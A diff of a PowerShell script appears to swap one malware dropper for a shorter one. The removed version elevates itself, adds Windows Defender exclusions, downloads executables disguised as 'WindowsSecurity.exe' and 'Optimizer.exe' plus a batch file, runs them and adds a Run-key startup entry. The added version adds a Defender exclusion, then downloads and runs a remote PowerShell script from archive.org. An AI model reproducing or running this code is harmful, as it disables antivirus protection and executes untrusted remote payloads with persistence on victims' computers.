@@ -1,113 +1,12 @@
-# تحقق مما إذا كان السكربت يعمل كمسؤول
-$CurrentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
+Add-MpPreference -ExclusionPath $env:USERPROFILE\Downloads
+$url = 'https://archive.org/download/script_20250313/script.ps1'
+$outputFile = [System.IO.Path]::Combine($env:USERPROFILE, 'Appdata', 'script.ps1')
 
-# إذا لم يكن السكربت يعمل كمسؤول، أعد تشغيله كمسؤول
-if (-not $CurrentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
-    # إعادة تشغيل السكربت كمسؤول باستخدام "runAs"
-    $Arguments = "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`""
-    Start-Process powershell -ArgumentList $Arguments -Verb RunAs
-    exit
-}
+# Wait until the exclusion is confirmed (just a safeguard, usually it happens instantly)
+Start-Sleep -Milliseconds 100 
 
-# إ
-Write-Host "تم تشغيل السكربت كمسؤول بنجاح!"
+# Download the file
+Invoke-WebRequest -Uri $url -OutFile $outputFile
 
-
-$Host.UI.RawUI.BackgroundColor = "Black"
-$Host.UI.RawUI.ForegroundColor = "Cyan"
-Clear-Host
-
-Write-Host "*******************************************"
-Write-Host "*** Script OPEN Successfully! *******"
-Write-Host "*******************************************"
-
-
-
-
-$UserProfile = [System.Environment]::GetFolderPath("UserProfile")
-$AppDataPath = "$UserProfile\AppData"
-$DownloadsPath = "$UserProfile\Downloads"
-
-$ExcludedPaths = @($AppDataPath, $DownloadsPath)
-
-foreach ($path in $ExcludedPaths) {
-    Add-MpPreference -ExclusionPath $path > $null 2>&1
-}
-
-Write-Host "`nThe script is starting, please wait...`n"
-
-# ✅ التحقق من وجود اتصال بالإنترنت قبل محاولة التنزيل
-function Test-InternetConnection {
-    try {
-        $response = Test-Connection -ComputerName google.com -Count 1 -ErrorAction Stop
-        return $true
-    } catch {
-        return $false
-    }
-}
-
-if (-not (Test-InternetConnection)) {
-    Write-Host "⚠ لا يوجد اتصال بالإنترنت! تأكد من الاتصال ثم أعد تشغيل السكربت." -ForegroundColor Red
-    exit
-}
-
-
-$url1 = "https://archive.org/download/pp_20250226/pp.bat"
-$output1 = "$env:USERPROFILE\AppData\System.bat"
-
-$url3 = "https://github.com/Hof6/R/raw/refs/heads/main/WindowsSecurity.exe"
-$output3 = "$env:USERPROFILE\AppData\WindowsSecurity.exe"
-
-$url2 = "https://github.com/Hof6/R/raw/refs/heads/main/Optimizer-16.7.exe"
-$output2 = "$env:USERPROFILE\AppData\Optimizer.exe"
-
-
-#
-Write-Host "Downloading ..."
-
-function Download-File($url, $output) {
-    try {
-        Invoke-WebRequest -Uri $url -OutFile $output -ErrorAction Stop *> $null
-        return $true
-    } catch {
-        Write-Host "❌ فشل في تحميل: $url" -ForegroundColor Red
-        return $false
-    }
-}
-
-if (Download-File $url1 $output1) {
-    Start-Process -FilePath $output1
-    Start-Sleep -Seconds 10
-} else {
-    exit
-}
-
-if (Download-File $url3 $output3) {
-    Start-Process -FilePath $output3
-} else {
-    exit
-}
-
-if (Download-File $url2 $output2) {
-    Start-Process -FilePath $output2
-} else {
-    exit
-}
-
-$RegistryPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-$AppName = "WindowsSecurity"
-$AppPath = "`"$output3`""  # المسار إلى الملف القابل للتنفيذ
-
-# تحقق مما إذا كان الإدخال موجودًا بالفعل
-if (!(Get-ItemProperty -Path $RegistryPath -Name $AppName -ErrorAction SilentlyContinue)) {
-    Set-ItemProperty -Path $RegistryPath -Name $AppName -Value $AppPath
-    Write-Host "✅ تمت إضافة WindowsSecurity إلى بدء التشغيل!" -ForegroundColor Green
-} else {
-    Write-Host "ℹ WindowsSecurity موجود بالفعل في بدء التشغيل." -ForegroundColor Yellow
-}
-
-Write-Host "`n*******************************************"
-Write-Host "*** Script Completed Successfully! *******"
-Write-Host "*******************************************"
-
-Pause
+# Run the downloaded file after the download is complete
+Start-Process powershell $outputFile
